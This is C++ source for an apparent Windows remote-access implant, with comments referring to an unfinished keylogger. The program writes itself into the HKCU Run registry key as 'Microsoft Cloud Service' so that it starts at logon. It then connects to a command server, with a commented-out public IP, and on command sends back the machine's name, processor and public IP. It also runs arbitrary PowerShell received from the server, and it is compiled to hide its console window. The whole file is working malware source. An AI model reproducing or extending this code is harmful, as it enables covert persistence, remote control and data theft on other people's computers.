//How to peacefully exit Keylogger function
//Incorrect Command sent to powershell


#include <ws2tcpip.h>
#include <stdio.h>
#include <string>
#include <Windows.h>
#include <wininet.h>
#include <iostream>
#include <iphlpapi.h>
#include <stdlib.h>
#include <string.h>
#include <fstream>
#include <vector>
#include <cstring>
#include <thread>
#include <iphlpapi.h>
#include <lmcons.h>
#include <winsock2.h>
#include <cstring>
#include <cstdlib>

#pragma comment(lib, "Ws2_32.lib")
using namespace std;

SOCKET clientSocket;
string msg;


//Compiler Command
//g++ 4.cpp -lws2_32 -lwininet -static-libgcc -static-libstdc++ -mwindows


void printCharToServer(char character, SOCKET& socket)
{
	string charStr(1, character);
	send(socket, charStr.c_str(), charStr.size(), 0);
	cout << character;
}

void printStringToServer(string character, SOCKET& socket)
{
	send(socket, character.c_str(), character.size(), 0);
	cout << character;
}




bool IsSocketConnected(SOCKET socket)
{
	string heartbeat = "_";
	//10057 - Socket Not Connected
	//10054 - Connection Reset by Peer
	if(send(clientSocket, heartbeat.c_str(), heartbeat.size(), 0) == SOCKET_ERROR)
	{
		return false;
	}
	else
	{
		Sleep(10000);
		return true;
	}
	


}

string static getActiveWindowTitle()
{
	char wnd_title[256];
	HWND hwnd = GetForegroundWindow(); // get handle of currently active window
	GetWindowTextA(hwnd, wnd_title, sizeof(wnd_title));
	return wnd_title;

}

string static getSystemInfo()
{
	//Computer Processor and Architecture
	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);
	DWORD _processor = sysinfo.dwProcessorType;
	DWORD _processor1 = sysinfo.wProcessorArchitecture;
	string processor = to_string(_processor);
	string processor2 = to_string(_processor1);

	//Computer Name
	DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
	char computerName[MAX_COMPUTERNAME_LENGTH + 1];
	GetComputerNameExA(ComputerNameNetBIOS, computerName, &size);


	//Public Ip
	LPCSTR name = "IP retreiver";
	LPCSTR link = "http://myexternalip.com/raw";


	HINTERNET net = InternetOpen(name,
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET conn = InternetOpenUrl(net,
		link,
		NULL,
		0,
		INTERNET_FLAG_RELOAD,
		0);

	char buffer[4096];
	DWORD read;

	InternetReadFile(conn, buffer, sizeof(buffer) / sizeof(buffer[0]), &read);
	InternetCloseHandle(net);

	string ip = string(buffer, read);


	string result = "Processor: ";

	for(char x: processor)
	{
		result += x;
	}
	result += "\n";
	result += "Architecture: ";
	for(char x: processor2)
	{
		result += x;
	}
	result += " (9 = x64 AMD or Intel, 5 = ARM, 12 = ARM64, 6 = Intel Itanium - based, 0 = x86)";
	result += "\n";

	result += "System Name: ";
	result += computerName;
	result += "\n";
	result += "Public Ip: ";
	result += ip;
	

	return result;
}

string static getUsername()
{
	char username[UNLEN + 1];
	DWORD length = UNLEN + 1;

	GetUserNameA(username, &length);
	string name = string(username, length);
	return name;

}

void static powerShell(string userCommand)
{
	if(userCommand.length() > 0 )
	{
		string command = "powershell.exe  -Command \"";
		command += userCommand;
		command += "\"";

		cout << command;

		LPSTR lpCommandLine = const_cast<LPSTR>(command.data());
		STARTUPINFOA startupInfo = { sizeof(startupInfo) };
		PROCESS_INFORMATION processInfo;

		//startupInfo.dwFlags |= STARTF_USESHOWWINDOW;
		//startupInfo.wShowWindow = SW_HIDE;

		int result = CreateProcessA(
			nullptr,
			lpCommandLine,
			nullptr,
			nullptr,
			false,
			0,
			nullptr,
			nullptr,
			&startupInfo,
			&processInfo
		);
		

		WaitForSingleObject(processInfo.hProcess, INFINITE);
		cout << GetLastError() << endl;

		//CloseHandle(processInfo.hProcess);
		//CloseHandle(processInfo.hThread);

	
	}

		
	
	



}

string deHeartbeatString(string str)
{
	string heartbeat = "muzer!@#tyrz";

	int found = str.find("muzer!@#tyrz");
	string newString = "";

	if(found != string::npos)
	{
		newString += str.substr(0, found);
		newString += str.substr((found + heartbeat.length()), str.length());
		return newString;

	}
	else
	{
		return str;
	}

	

	
}

DWORD WINAPI network(LPVOID LpParam)
{
	WSADATA wsaData;

	WORD wVersion = MAKEWORD(2, 2);
	WSAStartup(wVersion, &wsaData);

	// Create a socket
	clientSocket = socket(AF_INET, SOCK_STREAM, 0);

	// Fill in the address structure
	sockaddr_in hint;
	hint.sin_family = AF_INET;

	//Port Number
	hint.sin_port = htons(8089);

	//IP 

	string ipaddress = "127.0.0.1";
	hint.sin_addr.s_addr = inet_addr(ipaddress.c_str());

	//Local Testing
	//inet_pton(AF_INET, "54.167.46.14", &hint.sin_addr);

	//Server Testing
	//inet_pton(AF_INET, "127.0.0.1", &hint.sin_addr);


	

	while(true)
	{
		if(!IsSocketConnected(clientSocket))
		{
			clientSocket = socket(AF_INET, SOCK_STREAM, 0);
			connect(clientSocket, (sockaddr*)&hint, sizeof(hint));
			
		}
	}	Sleep(20);
	


}

DWORD WINAPI listen(LPVOID lpParam)
{
	while(true)
	{
	char buffer[1024];
	int bytes;
	bytes = recv(clientSocket, buffer, sizeof(buffer), 0);
	msg = deHeartbeatString(string(buffer, bytes));
	}

}




int main()
{
	//Adds exe file to system registry to run on startup
	//
	//
	

	wchar_t buffer[MAX_PATH];
	HMODULE hModule = GetModuleHandle(NULL);
	DWORD length = GetModuleFileNameW(hModule, buffer, MAX_PATH);


	wstring localPath(buffer);
	LPCWSTR fullString = localPath.c_str();

	char convertedBuffer[MAX_PATH];
	WideCharToMultiByte(CP_ACP, 0, fullString, -1, convertedBuffer, MAX_PATH, nullptr, nullptr);

	HKEY hKey;

	LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	res = RegSetValueExA(hKey, "Microsoft Cloud Service", 0, REG_SZ, (BYTE*)convertedBuffer, strlen(convertedBuffer) + 1);


	HANDLE hThread = CreateThread(NULL, 0, network, NULL, 0, NULL);


	while (true)
	{
		
		

		char buffer[1024];
		int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
		cout << "Home" << endl;	

		if(bytesReceived > 0)
		{

			string receivedString(buffer, bytesReceived);
			string deHeartbeatedString = deHeartbeatString(receivedString);

			//Change test to a complex heartbeat and check if it contains it, if it does, remove it and continue
			if (receivedString != "muzer!@#tyrz")
			{
				
				if (deHeartbeatedString == "A")
				{
					printStringToServer(getSystemInfo(), clientSocket);
				}

				}

				if(receivedString == "C")
				{

					bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
					string command = deHeartbeatString(string(buffer, bytesReceived));
					while(command.length() == 0)
					{
						bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
						command = deHeartbeatString(string(buffer, bytesReceived));
					
					}
					
					powerShell(command);
				}

				
			


			}

		
		}
		
		

		
		
		
	}
		

		


		
	
}

	

	






